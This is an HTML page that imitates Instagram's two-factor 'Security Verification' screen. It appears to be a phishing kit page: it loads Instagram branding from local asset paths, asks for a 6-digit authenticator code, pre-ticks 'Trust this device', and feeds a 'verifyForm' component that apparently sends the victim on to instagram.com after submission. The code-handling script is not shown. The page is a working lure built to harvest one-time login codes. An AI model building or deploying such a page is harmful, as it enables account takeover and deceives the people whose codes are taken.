<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Security Verification</title>
        <link rel="icon" href="./app/static/images/instagram-icon.png" />
        <link rel="stylesheet" href="./app/static/dist/style.css" />
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fontawesome-4.7@4.7.0/css/font-awesome.min.css" />
        <script defer src="./app/static/src/app.js"></script>
        <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.15.4/dist/cdn.min.js"></script>
    </head>
    <body class="m-0 min-h-screen overflow-x-hidden bg-[#fafafa] text-gray-900">
        <main class="flex min-h-screen items-center justify-center bg-[#fafafa] md:p-4">
            <section class="w-full rounded p-8 text-center md:max-w-87.5 md:border md:border-gray-300 md:bg-white" x-data="verifyForm('https://www.instagram.com/')">
                <div class="mb-6 flex justify-center"><img src="./app/static/images/instagram-verify.png" alt="Security Lock" class="h-19 w-19" /></div>
                <p class="mb-6 text-[14px] leading-4.5 text-[#262626]">Enter a 6-digit login code generated by an authentication app.</p>
                <div class="relative mx-auto mb-4 w-full"><input type="text" x-model="code" id="code" placeholder=" " @input="error = false" class="peer w-full rounded border border-gray-300 bg-gray-50 px-3 py-4 pt-4 pb-1 text-sm focus:border-gray-400 focus:outline-none" :class="error ? 'border-red-500' : ''" /><label for="code" class="pointer-events-none absolute top-1/2 left-3 -translate-y-1/2 text-sm text-[#5d6c7b] transition-all peer-focus:top-3 peer-focus:text-[12px] peer-[:not(:placeholder-shown)]:top-3 peer-[:not(:placeholder-shown)]:text-[12px]">Security Code</label></div>
                <button class="mb-4 w-full rounded bg-[#0095f6] px-4 py-1.5 text-sm font-semibold text-white hover:opacity-80" :disabled="loading" @click="submit()" x-html="loading ? '<i class=\'fa fa-rotate-right animate-spin\'></i>' : 'Confirm'"></button>
                <div class="mb-6 flex items-start gap-2 text-left">
                    <input type="checkbox" id="trust" class="mt-1" checked /><label for="trust" class="text-[12px] text-[#262626]"><b>Trust this device</b><br />We won't ask for a code next time you log in</label>
                </div>
                <p class="text-[12px] text-[#262626]">If you're unable to use a login code from an authentication app, you can get one by <a href="#" class="font-semibold text-[#00376b]">text message</a> or use one of your <a href="#" class="font-semibold text-[#00376b]">backup codes</a>.</p>
            </section>
        </main>
    </body>
</html>
